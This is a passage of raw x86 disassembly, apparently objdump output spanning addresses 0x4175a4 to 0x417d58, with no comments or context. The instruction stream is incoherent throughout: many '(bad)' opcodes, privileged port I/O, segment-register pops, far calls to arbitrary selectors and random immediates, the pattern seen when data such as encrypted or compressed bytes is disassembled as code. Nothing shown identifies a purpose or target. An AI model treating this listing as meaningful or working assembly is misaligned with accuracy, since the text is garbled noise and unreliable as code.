  4175a4:	mov    ebx,0xbcc74bc6
  4175a9:	pop    edi
  4175aa:	daa    
  4175ab:	in     al,dx
  4175ac:	fdiv   DWORD PTR [edi-0x572a47e1]
  4175b2:	repnz mov bh,0x9d
  4175b5:	fisttp DWORD PTR [ecx+0x45]
  4175b8:	clc    
  4175b9:	aam    0xa9
  4175bb:	inc    ebp
  4175bc:	xchg   BYTE PTR [esi+0x25],cl
  4175bf:	je     0x417557
  4175c1:	pop    ss
  4175c2:	adc    BYTE PTR [edi+0x48],bh
  4175c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175c6:	pop    eax
  4175c7:	mov    edi,0x422a9ab9
  4175cc:	dec    ebp
  4175cd:	popf   
  4175ce:	dec    ecx
  4175cf:	arpl   WORD PTR gs:[edi],bx
  4175d2:	outs   dx,BYTE PTR ds:[esi]
  4175d3:	xchg   edi,eax
  4175d4:	mov    BYTE PTR [ebp-0xe],cl
  4175d7:	xor    ecx,DWORD PTR [edx-0x29]
  4175da:	pop    ss
  4175db:	mov    edi,0x7013e4b4
  4175e0:	adc    DWORD PTR [esi+0x77],ebx
  4175e3:	ss (bad) 
  4175e5:	or     al,0x8d
  4175e7:	sub    eax,0x4f4e29a3
  4175ec:	xchg   BYTE PTR [ecx+0x2a170557],ah
  4175f2:	dec    ebp
  4175f3:	inc    ebx
  4175f4:	sbb    al,0x14
  4175f6:	imul   esi,DWORD PTR [ebp+0xce6c94a],0x1b270744
  417600:	addr16 dec esi
  417602:	lds    eax,FWORD PTR [edx]
  417604:	aam    0x2d
  417606:	ret    
  417607:	call   0xd1d8:0x4761fc2b
  41760e:	xchg   esp,eax
  41760f:	mov    al,ds:0xe08aedb2
  417614:	adc    al,0xe0
  417616:	xchg   ebx,eax
  417617:	push   DWORD PTR [edx+0x754974a5]
  41761d:	(bad)  
  41761e:	sbb    ch,BYTE PTR [eax+0x7307dce1]
  417624:	les    edi,FWORD PTR [eax+eiz*4+0x4f]
  417628:	jns    0x41766d
  41762a:	ror    DWORD PTR [eax],1
  41762c:	stos   BYTE PTR es:[edi],al
  41762d:	(bad)  
  41762e:	shl    BYTE PTR [edi],cl
  417630:	push   eax
  417631:	mov    BYTE PTR [edx],ch
  417633:	cmp    BYTE PTR [edi+0x4c],dl
  417636:	push   ecx
  417637:	inc    edi
  417638:	jno    0x4176ad
  41763a:	fisub  WORD PTR [eax+0x572a79e5]
  417640:	mov    ds:0xd69c1f16,al
  417645:	xchg   edi,eax
  417646:	ins    DWORD PTR es:[edi],dx
  417647:	mov    edx,fs
  417649:	mov    dh,0x38
  41764b:	sbb    ch,al
  41764d:	mov    bl,0x5d
  41764f:	outs   dx,BYTE PTR ds:[esi]
  417650:	push   0x24
  417652:	shr    DWORD PTR [ebp+0x53],0x10
  417656:	les    edi,FWORD PTR [eax+edx*2]
  417659:	inc    ebp
  41765a:	jne    0x417610
  41765c:	out    dx,al
  41765d:	push   0x79
  41765f:	dec    esi
  417660:	aas    
  417661:	call   0x2758:0xd64f4f0c
  417668:	pop    es
  417669:	mov    dh,0xf4
  41766b:	cli    
  41766c:	push   cs
  41766d:	push   edx
  41766e:	adc    al,0x15
  417671:	xor    dl,bh
  417673:	das    
  417674:	mov    edx,0x58a4ddec
  417679:	mov    BYTE PTR [edi],bh
  41767b:	jp     0x417662
  41767d:	sub    DWORD PTR [esi-0x6332a9af],edi
  417683:	xor    eax,0xc0815d59
  417688:	daa    
  417689:	push   cs
  41768a:	mov    eax,0x647f6441
  41768f:	scas   eax,DWORD PTR es:[edi]
  417690:	mov    dl,0x3c
  417692:	stos   BYTE PTR es:[edi],al
  417693:	adc    DWORD PTR [ecx+0x6a2d88bf],esp
  417699:	xor    DWORD PTR [ebp-0x5857de08],edi
  41769f:	xchg   ebp,eax
  4176a0:	inc    esp
  4176a1:	test   DWORD PTR [ecx+edi*2],esp
  4176a4:	push   esp
  4176a5:	std    
  4176a6:	mov    ah,0xe1
  4176a8:	loope  0x417662
  4176aa:	out    0x9a,al
  4176ac:	pushf  
  4176ad:	lods   al,BYTE PTR ds:[esi]
  4176ae:	outs   dx,DWORD PTR ds:[esi]
  4176af:	push   esp
  4176b0:	or     esp,DWORD PTR [ecx]
  4176b2:	cmc    
  4176b3:	cmp    al,0x1f
  4176b5:	je     0x417661
  4176b7:	or     al,0x9d
  4176b9:	fsubr  DWORD PTR [ebp-0x21]
  4176bc:	outs   dx,BYTE PTR ds:[esi]
  4176bd:	shr    DWORD PTR [edx+ecx*8+0x59],1
  4176c1:	xchg   DWORD PTR [ebx+0x2d],ebp
  4176c4:	pop    ecx
  4176c5:	and    DWORD PTR [edi-0x6bfe8f48],esi
  4176cb:	xchg   ecx,eax
  4176cc:	sbb    DWORD PTR [edx-0x31],esi
  4176cf:	js     0x4176ef
  4176d1:	rcl    DWORD PTR [eax+0x609b5cb1],1
  4176d7:	pop    ecx
  4176d8:	push   ecx
  4176d9:	mov    ds,ebp
  4176db:	aas    
  4176dc:	cdq    
  4176dd:	push   esp
  4176de:	jle    0x4176cd
  4176e0:	mov    ebp,0xa77f3b51
  4176e5:	pop    eax
  4176e6:	ins    BYTE PTR es:[edi],dx
  4176e7:	mov    ch,0x6f
  4176e9:	stos   BYTE PTR es:[edi],al
  4176ea:	mov    ebx,0x8959e0b1
  4176ef:	adc    al,0xa0
  4176f1:	sub    DWORD PTR [ecx-0x2664bd9a],0xffffff8e
  4176f8:	call   0x6f07:0xb71b7767
  4176ff:	sbb    DWORD PTR [edi],edi
  417701:	out    0x24,al
  417703:	jmp    DWORD PTR [ebx]
  417705:	gs fsubrp st(2),st
  417708:	xchg   esp,eax
  417709:	jne    0x417757
  41770b:	jae    0x417727
  41770d:	ss stos BYTE PTR es:[edi],al
  41770f:	stc    
  417710:	mov    esi,0x53871e9c
  417715:	push   0x9da2d3ad
  41771a:	mov    ds:0x373e7c52,eax
  41771f:	cmp    BYTE PTR [ebx],al
  417721:	mov    ah,0xc4
  417723:	and    al,BYTE PTR [ecx-0x4a]
  417726:	xor    cl,dh
  417728:	adc    BYTE PTR [ecx-0x29],0xfb
  41772c:	lods   al,BYTE PTR ds:[esi]
  41772d:	mov    al,0xe2
  41772f:	xchg   esp,eax
  417730:	ins    BYTE PTR es:[edi],dx
  417731:	int    0xa2
  417733:	inc    eax
  417734:	sbb    ch,BYTE PTR ds:0x9312f10e
  41773a:	sub    al,0x70
  41773c:	aam    0x8
  41773e:	push   es
  41773f:	xchg   DWORD PTR [eax+ebx*1+0x78],esi
  417743:	loope  0x4176c9
  417745:	jmp    0xba8b:0x340378ba
  41774c:	push   esi
  41774d:	call   FWORD PTR ds:0x8e9e83d1
  417753:	jne    0x4176fb
  417755:	cmc    
  417756:	pop    ebx
  417757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417758:	fwait
  417759:	rol    ah,cl
  41775b:	daa    
  41775c:	pop    ebp
  41775d:	and    ah,bh
  41775f:	sbb    al,0x78
  417761:	les    ebp,FWORD PTR [eax-0xc5a31a1]
  417767:	stos   DWORD PTR es:[edi],eax
  417768:	xchg   edx,eax
  417769:	push   ss
  41776a:	jmp    0x417764
  41776c:	pop    eax
  41776d:	call   0x5bce8f85
  417772:	mov    ds:0x1b9d70b5,al
  417777:	sub    al,0xf5
  417779:	sahf   
  41777a:	fld    DWORD PTR [edx]
  41777c:	inc    ecx
  41777d:	imul   ebp,DWORD PTR [edi-0x3a],0x8
  417781:	fbld   TBYTE PTR ds:0x3b0d680b
  417787:	in     eax,0x63
  417789:	iret   
  41778a:	mov    cl,0xf4
  41778c:	xor    BYTE PTR [edi+0x71d647eb],0x94
  417793:	inc    ebx
  417794:	(bad)  
  417795:	pop    edi
  417796:	aad    0x94
  417798:	stos   DWORD PTR es:[edi],eax
  417799:	call   0x1a9b:0x7300f011
  4177a0:	call   0x7d9ecd15
  4177a5:	cmp    BYTE PTR [edx+ecx*8-0x4bfcbfc8],0x1c
  4177ad:	mov    ebx,0x1df9cfdb
  4177b2:	fisttp WORD PTR [edx+ebp*8+0x64]
  4177b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177b7:	mov    esi,0x4cba183e
  4177bc:	aad    0x8f
  4177be:	and    eax,0x81782820
  4177c3:	repz popf 
  4177c5:	dec    esi
  4177c6:	test   DWORD PTR [edi],ebx
  4177c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177c9:	ds pop ebp
  4177cb:	adc    eax,0x79a21a5c
  4177d0:	fistp  QWORD PTR [esp+edi*4-0x4dd4ba9c]
  4177d7:	cmp    al,0x32
  4177d9:	(bad)  
  4177da:	rcl    BYTE PTR [ebx],1
  4177dc:	jmp    0x633a:0x9acd0028
  4177e3:	shl    ch,0x95
  4177e6:	test   DWORD PTR [edi+0x47d3c1f2],ecx
  4177ec:	cmp    eax,0x7c5076ce
  4177f1:	mov    ds:0xa0025e7c,al
  4177f6:	pop    esp
  4177f7:	pop    eax
  4177f8:	pop    eax
  4177f9:	cs xchg edx,eax
  4177fb:	mov    ebx,0x3429aa2f
  417800:	mov    edx,0xcb863ab0
  417805:	push   edx
  417806:	or     esi,0x4c6c0ad0
  41780c:	mov    esi,0x2606e5cb
  417811:	mov    eax,cs
  417813:	jp     0x4177b0
  417815:	js     0x417861
  417817:	test   edi,0x67267e33
  41781d:	fucom  st(7)
  41781f:	mov    dl,0x9d
  417821:	or     BYTE PTR [ecx-0x58],cl
  417824:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417825:	xchg   ecx,eax
  417826:	push   cs
  417827:	arpl   WORD PTR [edx+0x37],sp
  41782a:	push   edi
  41782b:	jmp    0x35b94fe7
  417830:	mov    esp,0xd87be22a
  417835:	mov    al,0x67
  417837:	int3   
  417838:	mov    al,0x5b
  41783a:	sub    ch,BYTE PTR [edi+esi*1-0x69d9928c]
  417841:	les    ecx,FWORD PTR [edi-0x55]
  417844:	imul   ebp,DWORD PTR [esi],0xbc8f468d
  41784a:	inc    eax
  41784b:	jecxz  0x41782c
  41784d:	mov    bh,0xe5
  41784f:	or     ch,BYTE PTR [ebx-0x3d]
  417852:	(bad)  
  417854:	addr16 mov dl,0x6e
  417857:	sti    
  417858:	pop    ds
  417859:	(bad)  
  41785a:	retf   0xf041
  41785d:	fmul   st(0),st
  41785f:	inc    esp
  417860:	je     0x41788c
  417862:	xchg   ebp,eax
  417863:	loope  0x417856
  417865:	scas   al,BYTE PTR es:[edi]
  417866:	adc    edx,0xffffffe6
  417869:	xor    edi,DWORD PTR [eax]
  41786b:	pop    edx
  41786c:	cli    
  41786d:	inc    esi
  41786e:	cmp    al,0x4e
  417870:	(bad)  fs:[edx+0x5fe71d96]
  417877:	cmc    
  417878:	sbb    eax,0xda05aed4
  41787d:	xor    al,0x55
  41787f:	(bad)  
  417880:	(bad)  
  417881:	xchg   edx,eax
  417882:	scas   al,BYTE PTR es:[edi]
  417883:	into   
  417884:	fsincos 
  417886:	lock out 0x56,al
  417889:	xchg   DWORD PTR [si+0x10],eax
  41788d:	xchg   edi,eax
  41788e:	outs   dx,DWORD PTR ds:[esi]
  41788f:	enter  0xb42c,0x25
  417893:	loope  0x41783c
  417895:	cmp    ecx,DWORD PTR [ecx-0xf]
  417898:	iret   
  417899:	dec    ecx
  41789a:	add    eax,0x62b9c406
  41789f:	repnz mov BYTE PTR [eax],dl
  4178a2:	or     DWORD PTR [esi],ebx
  4178a4:	mov    bl,BYTE PTR [ebx+eiz*4-0x7d]
  4178a8:	inc    esp
  4178a9:	idiv   DWORD PTR [esi]
  4178ab:	xor    ebp,DWORD PTR [edi]
  4178ad:	jmp    0xb21aea70
  4178b2:	add    ah,BYTE PTR [edi]
  4178b4:	sbb    ebx,0x6e
  4178b7:	cmp    al,BYTE PTR [edx-0x6a]
  4178ba:	jne    0x4178b4
  4178bc:	lahf   
  4178bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178be:	jnp    0x4178ea
  4178c0:	in     al,0x99
  4178c2:	and    dh,cl
  4178c4:	mov    edi,DWORD PTR [edi]
  4178c6:	loope  0x41789a
  4178c8:	ins    BYTE PTR es:[edi],dx
  4178c9:	imul   esp,esi,0x5c
  4178cc:	out    0x3b,eax
  4178ce:	fisttp DWORD PTR [ebx-0x7d2c2ffe]
  4178d4:	icebp  
  4178d5:	and    DWORD PTR [eax-0x7b],esi
  4178d8:	leave  
  4178d9:	mov    ecx,0x4d809d83
  4178de:	mov    dl,0x48
  4178e0:	mul    BYTE PTR [eax+eiz*8]
  4178e3:	xor    BYTE PTR [esi],dl
  4178e5:	add    dl,0xfb
  4178e8:	fwait
  4178e9:	imul   edx,DWORD PTR [ecx-0x6b02640],0x4
  4178f0:	call   0xac22:0x78b9b8b7
  4178f7:	ret    
  4178f8:	xor    eax,0x12ef8208
  4178fd:	adc    dh,cl
  4178ff:	pop    es
  417900:	ja     0x41790a
  417902:	pop    ss
  417903:	or     eax,edx
  417905:	shl    BYTE PTR [edx+0x24880eee],1
  41790b:	cmp    DWORD PTR [ecx+0x6f],ebp
  41790e:	push   ebp
  41790f:	sbb    BYTE PTR [ebx-0x606788ea],ch
  417915:	sbb    ebp,DWORD PTR [esi+0x25]
  417918:	pushf  
  417919:	lods   al,BYTE PTR ds:[esi]
  41791a:	cmp    al,al
  41791c:	out    dx,eax
  41791d:	call   0x466ac35d
  417922:	mov    al,ds:0x33101f01
  417927:	or     ebx,DWORD PTR [edi-0x14]
  41792a:	jo     0x417952
  41792c:	fsubr  QWORD PTR [ebp-0x72]
  41792f:	xchg   edx,eax
  417930:	(bad)  
  417931:	ss push 0xffffffe0
  417934:	inc    edx
  417935:	ins    DWORD PTR es:[edi],dx
  417936:	sbb    BYTE PTR [eax-0x6890c531],cl
  41793c:	je     0x41793f
  41793e:	hlt    
  41793f:	add    edi,0xc5929034
  417945:	add    bl,BYTE PTR [edi-0x69b3a4c7]
  41794b:	dec    edx
  41794c:	mov    ch,0x11
  41794e:	sbb    DWORD PTR [edx-0x227a0093],edi
  417954:	mov    cl,0x9d
  417956:	cs and esp,ecx
  417959:	lods   al,BYTE PTR ds:[esi]
  41795a:	addr16 inc ebp
  41795c:	movntps XMMWORD PTR ds:0x223a03b,xmm7
  417963:	cld    
  417964:	popf   
  417965:	sbb    eax,0x75b030b
  41796a:	and    cl,dh
  41796c:	or     eax,0xab894fa2
  417971:	push   edi
  417972:	pusha  
  417973:	ss popf 
  417975:	push   ds
  417976:	shl    DWORD PTR [eax+ebx*4-0x48c924b2],1
  41797d:	xchg   esi,eax
  41797e:	shr    BYTE PTR ds:0xa361e361,cl
  417984:	aas    
  417985:	and    al,BYTE PTR [ecx]
  417987:	add    al,0x52
  417989:	and    edx,0xffffff99
  41798c:	daa    
  41798d:	jge    0x4179a6
  41798f:	out    0xfa,eax
  417991:	out    0x49,al
  417993:	mov    ebx,0x9f3718d6
  417998:	arpl   WORD PTR [edx+0x69],cx
  41799b:	cs push esi
  41799d:	pop    edi
  41799e:	arpl   WORD PTR [eax+0x2013804e],dx
  4179a4:	mov    bh,0x32
  4179a6:	mov    WORD PTR ds:0x618fabd8,?
  4179ac:	sbb    ecx,ebp
  4179ae:	xor    dl,bl
  4179b0:	jp     0x417982
  4179b2:	(bad)  
  4179b3:	bound  edi,QWORD PTR [eax-0x52e4cb8]
  4179b9:	mov    ebx,0xbe5f67ab
  4179be:	cmp    ch,BYTE PTR [eax]
  4179c0:	mov    eax,0xf5f5d883
  4179c5:	(bad)  
  4179c6:	xchg   ebx,eax
  4179c7:	sbb    bl,ah
  4179c9:	sbb    esp,ecx
  4179cb:	out    0xf4,al
  4179cd:	std    
  4179ce:	jp     0x4179f3
  4179d0:	dec    ebp
  4179d1:	popf   
  4179d2:	das    
  4179d3:	xchg   BYTE PTR [edi+0x380dbc61],dh
  4179d9:	xor    eax,0x88bb7f20
  4179de:	cmp    cl,dh
  4179e0:	aam    0x1f
  4179e2:	lods   eax,DWORD PTR ds:[esi]
  4179e3:	mov    BYTE PTR [esi+0x43],al
  4179e6:	lea    ebp,[edx-0x4c]
  4179e9:	and    al,0xbd
  4179eb:	cmp    BYTE PTR [eax+ecx*1],bl
  4179ee:	jmp    0xb1c:0xd10e95fd
  4179f5:	jno    0x41797f
  4179f7:	sbb    al,0x44
  4179f9:	cmp    BYTE PTR [esi],al
  4179fb:	pop    ds
  4179fc:	xor    dh,BYTE PTR [eax+0x687c9357]
  417a02:	sbb    DWORD PTR [edi],esp
  417a04:	js     0x417a5d
  417a06:	(bad)  
  417a07:	pop    ss
  417a08:	inc    ebp
  417a09:	jg     0x417a41
  417a0b:	popa   
  417a0c:	jno    0x4179f9
  417a0e:	pop    ds
  417a0f:	sbb    bl,0xa8
  417a12:	add    ebp,DWORD PTR [edx+0x449d5cc]
  417a18:	push   esp
  417a19:	and    bl,BYTE PTR [esi+edi*2]
  417a1c:	repz pop esp
  417a1e:	aam    0x3
  417a20:	and    ch,ah
  417a22:	rcl    DWORD PTR [eax-0x68],cl
  417a25:	mov    eax,0x4503a987
  417a2a:	sub    bh,bl
  417a2c:	fs icebp 
  417a2e:	push   ebx
  417a2f:	adc    esi,DWORD PTR [ebx-0x7a]
  417a32:	and    al,0xc5
  417a34:	stos   BYTE PTR es:[edi],al
  417a35:	sub    DWORD PTR [ecx-0x6b],esp
  417a38:	std    
  417a39:	adc    ebp,DWORD PTR [edi+0x17]
  417a3c:	icebp  
  417a3d:	lea    edx,[eax+ecx*2]
  417a40:	cmp    ah,BYTE PTR [edi+0x20]
  417a43:	gs stc 
  417a45:	jns    0x417a36
  417a47:	mov    BYTE PTR ds:0x8cc365bf,ah
  417a4d:	rcl    BYTE PTR [edi+ebp*1+0x675855c6],0x49
  417a55:	mov    bl,0x3b
  417a57:	dec    ebx
  417a58:	sti    
  417a59:	dec    eax
  417a5a:	pop    ds
  417a5b:	or     edx,ecx
  417a5d:	ret    
  417a5e:	push   eax
  417a5f:	xor    eax,0xbb74d119
  417a64:	or     BYTE PTR [ebp+0x52],dh
  417a67:	pop    edx
  417a68:	sub    DWORD PTR [ebx-0x723e026],esp
  417a6e:	and    edi,DWORD PTR [edx-0x4a]
  417a71:	mov    ch,0x2c
  417a73:	jno    0x417a10
  417a75:	push   cs
  417a76:	outs   dx,BYTE PTR ds:[esi]
  417a77:	sbb    bh,BYTE PTR [ebx-0x300ca3e4]
  417a7d:	pop    esi
  417a7e:	aaa    
  417a7f:	ins    BYTE PTR es:[edi],dx
  417a80:	mov    ch,0x82
  417a82:	push   esi
  417a83:	push   esi
  417a84:	repz and eax,eax
  417a87:	imul   ch
  417a89:	jge    0x417b01
  417a8b:	mov    ebp,DWORD PTR [edx+0x7b]
  417a8e:	lea    ecx,[edi]
  417a90:	push   ds
  417a91:	shl    DWORD PTR [ebp-0x16fbef0e],0x87
  417a98:	dec    esp
  417a99:	repnz mov al,ds:0xc709af71
  417a9f:	xchg   ecx,eax
  417aa0:	xor    cl,BYTE PTR [esi]
  417aa2:	(bad)  
  417aa4:	mov    bh,0xb0
  417aa6:	jns    0x417aa0
  417aa8:	mov    ebp,0x46943c67
  417aad:	inc    edx
  417aae:	jb     0x417a8b
  417ab0:	mov    dh,0xb2
  417ab2:	jecxz  0x417ac9
  417ab4:	stos   BYTE PTR es:[edi],al
  417ab5:	push   edx
  417ab6:	mov    ah,0xac
  417ab8:	stos   DWORD PTR es:[edi],eax
  417ab9:	fwait
  417aba:	(bad)  
  417abb:	push   ss
  417abc:	out    0x5c,al
  417abe:	lds    esi,FWORD PTR [edx-0x22]
  417ac1:	int3   
  417ac2:	jmp    0x417a64
  417ac4:	outs   dx,DWORD PTR ds:[esi]
  417ac5:	or     DWORD PTR [ecx],esi
  417ac7:	leave  
  417ac8:	fidiv  DWORD PTR [esi-0x5a]
  417acb:	or     BYTE PTR [ebx+0xc83a1fe],al
  417ad1:	jge    0x417a54
  417ad3:	or     esp,DWORD PTR ss:[ebp+0x4060db89]
  417ada:	js     0x417a7e
  417adc:	xor    BYTE PTR ds:0x8265761f,dh
  417ae2:	aaa    
  417ae3:	std    
  417ae4:	inc    esp
  417ae5:	jmp    DWORD PTR [ebx+0xc483d2c]
  417aeb:	iret   
  417aec:	popa   
  417aed:	mov    eax,0x53e77e84
  417af2:	cmp    eax,0x8e376d5c
  417af7:	mov    dl,0xa5
  417af9:	into   
  417afa:	sub    al,0xcf
  417afc:	inc    eax
  417afd:	loopne 0x417b18
  417aff:	and    DWORD PTR ds:0xff9b1100,esi
  417b05:	popf   
  417b06:	inc    ebx
  417b07:	repnz and bh,cl
  417b0a:	std    
  417b0b:	lock ds mov ah,0xb9
  417b0f:	or     cl,0x1
  417b12:	jbe    0x417b4d
  417b14:	rol    ch,1
  417b16:	or     edi,DWORD PTR [esi]
  417b18:	add    al,0x49
  417b1a:	fcomp  QWORD PTR [ecx]
  417b1c:	adc    DWORD PTR [edi],ebx
  417b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b1f:	jp     0x417ad7
  417b21:	mov    dx,0xb893
  417b25:	out    0xe3,al
  417b27:	stc    
  417b28:	push   edx
  417b29:	xor    DWORD PTR [esi+0x21e183ae],0x5ef10283
  417b33:	or     bl,al
  417b35:	lods   eax,DWORD PTR ds:[esi]
  417b36:	cdq    
  417b37:	repnz or al,0xff
  417b3a:	xchg   cl,bh
  417b3c:	out    dx,eax
  417b3d:	mov    ecx,0x355b7adf
  417b42:	lds    eax,FWORD PTR [edx]
  417b44:	cmp    dl,BYTE PTR [eax-0x5db9aee0]
  417b4a:	mov    ds:0x5234a14b,eax
  417b4f:	push   esp
  417b50:	cmp    cl,al
  417b52:	mov    al,BYTE PTR [ecx]
  417b54:	nop
  417b55:	inc    ebp
  417b56:	iret   
  417b57:	push   edi
  417b58:	pop    esp
  417b59:	iret   
  417b5a:	inc    ebx
  417b5b:	popa   
  417b5c:	push   esi
  417b5d:	inc    ebp
  417b5e:	adc    edi,DWORD PTR [edx-0x6e3e6e90]
  417b64:	popf   
  417b65:	arpl   WORD PTR [esi],bx
  417b67:	lock fcomp DWORD PTR [ebx]
  417b6a:	(bad)  
  417b6b:	(bad)  [esi-0x67]
  417b6e:	ret    0x1dde
  417b71:	outs   dx,DWORD PTR ds:[esi]
  417b72:	out    0x36,al
  417b74:	and    bl,BYTE PTR [ebx-0x5bae0642]
  417b7a:	push   eax
  417b7b:	mov    ecx,0x7c2c97b0
  417b80:	push   cs
  417b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b82:	dec    cx
  417b84:	stos   BYTE PTR es:[edi],al
  417b85:	sub    al,0xc5
  417b87:	sbb    dl,BYTE PTR [edi+ecx*1]
  417b8a:	xchg   edi,eax
  417b8b:	jbe    0x417bc7
  417b8d:	aad    0x9c
  417b8f:	mov    ah,0xd7
  417b91:	mov    al,0x81
  417b93:	ds jmp 0x143d12f6
  417b99:	pusha  
  417b9a:	repnz sbb BYTE PTR [eax+0x60],cl
  417b9e:	mov    fs,WORD PTR [edi]
  417ba0:	mov    ah,0xb3
  417ba2:	adc    ah,BYTE PTR [edi-0x61604061]
  417ba8:	mov    bl,ah
  417baa:	push   es
  417bab:	jne    0x417be4
  417bad:	mov    ebp,0x7665e147
  417bb2:	std    
  417bb3:	inc    edx
  417bb4:	mov    DWORD PTR [edi],ebp
  417bb6:	retf   
  417bb7:	inc    ebp
  417bb8:	stc    
  417bb9:	(bad)  
  417bbb:	sbb    DWORD PTR [esi+edx*2],0xffffff84
  417bbf:	add    al,0xa9
  417bc1:	pop    esp
  417bc2:	adc    BYTE PTR [ebx+0x51383ad0],bh
  417bc8:	jbe    0x417bf5
  417bca:	adc    al,0x27
  417bcc:	dec    eax
  417bcd:	add    ah,BYTE PTR [esp+ebp*4]
  417bd0:	or     DWORD PTR [ebx-0x5f],ecx
  417bd3:	mov    cl,0x5c
  417bd5:	fiadd  WORD PTR [ecx-0x5ad1b3bd]
  417bdb:	mov    bh,0x1a
  417bdd:	fldcw  WORD PTR ds:0xf1d86736
  417be3:	pop    esi
  417be4:	xchg   edx,eax
  417be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be6:	pop    esp
  417be7:	retf   
  417be8:	push   ebp
  417be9:	fmul   DWORD PTR [edx+edi*8-0x938da6a]
  417bf0:	jge    0x417c3b
  417bf2:	cmpxchg BYTE PTR [esp+edi*8],al
  417bf6:	sbb    eax,0xd17d7e36
  417bfb:	xor    al,0xd0
  417bfd:	or     al,0xa2
  417bff:	iret   
  417c00:	mov    ah,0x1a
  417c02:	enter  0x66b1,0x7c
  417c06:	dec    DWORD PTR [ebx-0x50688884]
  417c0c:	jp     0x417c4c
  417c0e:	mov    esi,0xf9108f76
  417c13:	mov    dl,0xa5
  417c15:	fnstcw WORD PTR [edx+ebx*2]
  417c18:	jg     0x417c91
  417c1a:	(bad)  
  417c1b:	mov    esi,0xde635c58
  417c20:	xchg   DWORD PTR [ebx-0x4d],ebx
  417c23:	arpl   WORD PTR [ecx+0x7f],si
  417c26:	adc    cl,BYTE PTR [edi+eiz*4-0x3391a084]
  417c2d:	js     0x417bd8
  417c2f:	pop    eax
  417c30:	aam    0x30
  417c32:	mov    esp,0x8c9a8734
  417c37:	cmc    
  417c38:	pop    ss
  417c39:	pop    ss
  417c3a:	neg    BYTE PTR [esi+edi*8-0x5bbcd335]
  417c41:	stos   DWORD PTR es:[di],eax
  417c43:	jge    0x417c01
  417c45:	sbb    bl,BYTE PTR [esi-0x45c041a1]
  417c4b:	popf   
  417c4c:	ja     0x417bdd
  417c4e:	stos   DWORD PTR es:[edi],eax
  417c4f:	mov    al,0x4a
  417c51:	or     bh,BYTE PTR [esi]
  417c53:	mov    edx,0x213a1c44
  417c58:	scas   al,BYTE PTR es:[edi]
  417c59:	push   0xdd63fc8f
  417c5e:	cmp    DWORD PTR [ebp+0x37],ebx
  417c61:	je     0x417c6b
  417c63:	outs   dx,DWORD PTR ds:[esi]
  417c64:	imul   esp,DWORD PTR [eax+0x49018aa4],0x4daed3a9
  417c6e:	xchg   edi,eax
  417c6f:	inc    esi
  417c70:	or     eax,0x38cc0986
  417c75:	dec    esi
  417c76:	aaa    
  417c77:	sbb    bl,dh
  417c79:	mov    bl,0x76
  417c7b:	mov    cl,0x8a
  417c7d:	call   0xe21c:0xc9b5d785
  417c84:	pop    ebp
  417c85:	repz ret 0x2ca
  417c89:	adc    bl,BYTE PTR [ecx-0x29ce99ad]
  417c8f:	in     al,dx
  417c90:	dec    eax
  417c91:	xor    al,0xc6
  417c93:	xor    al,BYTE PTR [esi]
  417c95:	cmc    
  417c96:	loopne 0x417cac
  417c98:	stc    
  417c99:	jge    0x417ca6
  417c9b:	stos   DWORD PTR es:[edi],eax
  417c9c:	mov    ecx,0x30d9a2b9
  417ca1:	add    al,0x63
  417ca3:	or     al,BYTE PTR [ebp+edx*4-0x6b]
  417ca7:	ret    0x79c8
  417caa:	jmp    0xdd3117df
  417caf:	xor    al,0x32
  417cb1:	mov    DWORD PTR [esi+0x179cc943],ebx
  417cb7:	popa   
  417cb8:	addr16 stc 
  417cba:	fmul   st(0),st
  417cbc:	inc    ecx
  417cbd:	addr16 pop edi
  417cbf:	add    bl,BYTE PTR [edx-0x4ee183f1]
  417cc5:	repz retf 
  417cc7:	sub    DWORD PTR [eax+0x4d1b454e],0x5f568536
  417cd1:	test   BYTE PTR [esi],ah
  417cd3:	xchg   esi,eax
  417cd4:	repnz mov ecx,0x28801e5
  417cda:	sub    bh,BYTE PTR [ecx+0x2cd91b6]
  417ce0:	aam    0x48
  417ce2:	and    DWORD PTR [edi-0x267b3f7c],esp
  417ce8:	adc    ax,0x73fd
  417cec:	je     0x417ced
  417cee:	dec    edx
  417cef:	outs   dx,DWORD PTR ds:[esi]
  417cf0:	push   esp
  417cf1:	rol    cl,0xd2
  417cf4:	data16 daa 
  417cf6:	inc    ebp
  417cf7:	mov    edi,esp
  417cf9:	out    0xc2,eax
  417cfb:	scas   al,BYTE PTR es:[edi]
  417cfc:	(bad)  
  417cfd:	pop    edi
  417cfe:	and    ebp,DWORD PTR [edi]
  417d00:	pop    esi
  417d01:	sar    BYTE PTR [eax-0x80],1
  417d04:	add    eax,0x8a5d2db1
  417d09:	mov    esp,0x31f21c82
  417d0e:	std    
  417d0f:	mov    ch,0x36
  417d11:	data16 neg ch
  417d14:	int3   
  417d15:	outs   dx,DWORD PTR ds:[esi]
  417d16:	pop    edx
  417d17:	stos   DWORD PTR es:[edi],eax
  417d18:	ins    BYTE PTR es:[edi],dx
  417d19:	mov    edx,0x57a4cf91
  417d1e:	std    
  417d1f:	fisttp WORD PTR [ecx]
  417d21:	and    al,0x7a
  417d23:	mov    edi,ss
  417d25:	out    0x9c,eax
  417d27:	in     eax,dx
  417d28:	and    DWORD PTR [ecx],ebx
  417d2a:	mov    ecx,0xb617aca6
  417d2f:	push   eax
  417d30:	int    0x11
  417d32:	dec    ebp
  417d33:	sbb    eax,DWORD PTR [ecx]
  417d35:	retf   0x7022
  417d38:	inc    esi
  417d39:	sub    cl,BYTE PTR [esi+0x4]
  417d3c:	add    DWORD PTR [ebx],edi
  417d3e:	cld    
  417d3f:	rol    BYTE PTR [eax+edi*2],1
  417d42:	test   eax,0xcbf83bff
  417d47:	inc    ebx
  417d48:	or     edx,DWORD PTR [edi-0x5d]
  417d4b:	lds    ebp,FWORD PTR [ebx]
  417d4d:	lods   al,BYTE PTR ds:[esi]
  417d4e:	and    al,0x8c
  417d50:	mov    bl,0x6b
  417d52:	pop    esi
  417d53:	xchg   ecx,eax
  417d54:	push   ds
  417d55:	add    bh,BYTE PTR [eax]
  417d57:	pop    edx
  417d58:	sbb    esi,DWORD PTR [edx-0x3a]
